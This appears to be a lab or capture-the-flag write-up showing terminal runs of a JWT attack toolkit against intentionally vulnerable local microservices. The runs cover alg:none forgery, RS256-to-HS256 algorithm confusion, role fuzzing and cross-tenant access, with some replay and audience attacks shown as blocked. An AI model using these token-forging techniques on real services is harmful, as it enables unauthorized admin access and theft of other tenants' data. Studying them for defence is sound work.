### Terminal Attack Outputs

Below are the actual terminal outputs from running our automated toolkit against the vulnerable microservices. These prove the efficacy of our exploits.

#### 1. alg:none Bypass Attack
```bash
$ python3 attack.py none $TOKEN --target http://localhost:5001/admin/vulnerable --set role=admin

══════════════════════════════════════════════════════════════
  Starting Module: NONE
══════════════════════════════════════════════════════════════

[*] Legitimate token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
[*] 
Step 2: Forging alg=none admin token...

  ── Token Comparison ──
  Header.alg: RS256 → none
  Payload.role: user → admin

[*] Forged header:  { "alg": "none", "typ": "JWT" }
[*] Forged token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZS...
[*] 
Step 3: Accessing http://localhost:5001/admin/vulnerable with forged token...
[+] 🚨 ATTACK SUCCESSFUL!
[+] FLAG: FLAG{jwt_bypass_success_admin}
[+] Response: {
  "flag": "FLAG{jwt_bypass_success_admin}",
  "message": "\ud83d\udd13 ADMIN ACCESS GRANTED"
}
```

#### 2. RS256→HS256 Algorithm Confusion
```bash
$ python3 attack.py confusion --target http://localhost:5001 --endpoint http://localhost:5001/admin/vulnerable --set role=admin

══════════════════════════════════════════════════════════════
  Starting Module: CONFUSION
══════════════════════════════════════════════════════════════

[*] Fetching public key from http://localhost:5001/public-key ...
[+] Public key obtained (451 bytes)
[*] 
Step 2: Forging admin JWT (alg=HS256, secret=public_key)...
[*] Forged payload: { "sub": "hacker", "role": "admin", ... }
[*] 
Forged token (HS256 signed with public key):
[*]   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoYWNrZXIiLCJyb2xlIjoiYWRtaW4iLCJ...
[*] 
Step 3: Sending forged token to /admin ...
[+] 🚨 ATTACK SUCCESSFUL!
[+] FLAG: FLAG{jwt_bypass_success_admin}
```

#### 3. Authorization Fuzzing
```bash
$ python3 attack.py fuzz $TOKEN --target http://localhost:5001/admin/vulnerable                                      

══════════════════════════════════════════════════════════════
  Starting Module: FUZZ
══════════════════════════════════════════════════════════════

[*] Starting Authorization Fuzzer against http://localhost:5001/admin/vulnerable
[*] Testing mutation: {"role": "admin"}
[+] Bypass successful! Status: 200
[*] Testing mutation: {"role": "administrator"}
[-] Forbidden (403) - Authorization Boundary Enforced.
[*] Testing mutation: {"superadmin": true}
[-] Forbidden (403) - Authorization Boundary Enforced.
...
[*] Fuzzing complete. Successful bypasses: 1/11
```

#### 4. Tenant Isolation Abuse
```bash
$ python3 attack.py tenants $TOKEN --target http://localhost:5001/tenant-data/vulnerable/companyB --tenant companyB           

══════════════════════════════════════════════════════════════
  Starting Module: TENANTS
══════════════════════════════════════════════════════════════

[*] Executing Tenant Abuse Attack against http://localhost:5001/tenant-data/vulnerable/companyB
[*] Targeting Tenant ID: companyB
[*] Forged Payload: {"tenant": "companyB"}
[*] Sending request...
[+] 🚨 Cross-Tenant Access Successful!
[+] Response: {
  "flag": "FLAG{tenant_abuse_companyB}",
  "message": "Data for companyB"
}
```

#### 5. Failed Attacks (Proving Defense-in-Depth)
Our toolkit also tests attacks that the server is successfully hardened against, proving we understand both offense and defense.
```bash
# REPLAY ATTACK BLOCKED
$ python3 attack.py replay $TOKEN --target http://localhost:5001/admin/vulnerable --count 5
[*] Request 1/5... Blocked! (Status 401)
[*] Replay Summary: 0 Accepted, 5 Blocked.
[+] Target is SECURE against replay attacks.

# AUDIENCE CONFUSION BLOCKED
$ python3 attack.py audience $TOKEN --target http://localhost:5001/admin/vulnerable
[*] Testing aud='admin-service'... Failed: Status 403
```
